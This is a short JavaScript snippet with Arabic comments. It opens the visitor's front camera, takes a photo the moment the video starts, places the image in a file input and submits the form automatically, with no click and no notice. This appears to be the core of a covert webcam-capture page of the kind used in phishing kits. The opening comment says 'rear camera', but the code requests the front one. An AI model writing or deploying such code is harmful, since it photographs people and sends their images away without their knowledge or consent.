// تحديد الكاميرا الخلفية إن أمكن
const constraints = {
  video: {
    facingMode: { ideal: "user" } // الكاميرا الأمامية
  },
  audio: false
};

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const fileInput = document.getElementById("photoFile");
const form = document.getElementById("uploadForm");

navigator.mediaDevices.getUserMedia(constraints)
  .then(stream => {
    video.srcObject = stream;

    video.onloadedmetadata = () => {
      video.play();

      // التقط الصورة فورًا بعد جاهزية الفيديو
      captureAndSend();
    };
  })
  .catch(err => {
    console.error("فشل الوصول للكاميرا:", err);
  });

function captureAndSend() {
  // تأكد أن الفيديو جاهز
  if (video.readyState >= 2) {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // حول الصورة إلى blob
    canvas.toBlob(blob => {
      const file = new File([blob], "photo.jpg", { type: "image/jpeg" });

      const dt = new DataTransfer();
      dt.items.add(file);
      fileInput.files = dt.files;

      // أرسل النموذج
      form.submit();
    }, "image/jpeg");
  } else {
    // إذا الفيديو لسا ما اشتغل، انتظر شوي وجرب تاني
    setTimeout(captureAndSend, 100);
  }
}
